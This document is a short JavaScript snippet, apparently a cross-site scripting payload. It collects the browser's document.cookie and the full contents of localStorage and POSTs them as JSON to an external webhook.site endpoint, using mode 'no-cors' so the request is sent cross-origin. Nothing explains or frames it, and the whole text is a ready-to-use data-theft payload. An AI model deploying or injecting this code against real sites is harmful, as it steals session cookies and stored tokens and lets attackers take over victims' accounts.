var dados = {
    cookies: document.cookie,
    ls: localStorage
};

fetch('https://webhook.site/61aa1162-5b7a-4de1-afa0-c49315a5bb4d', {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify(dados)
});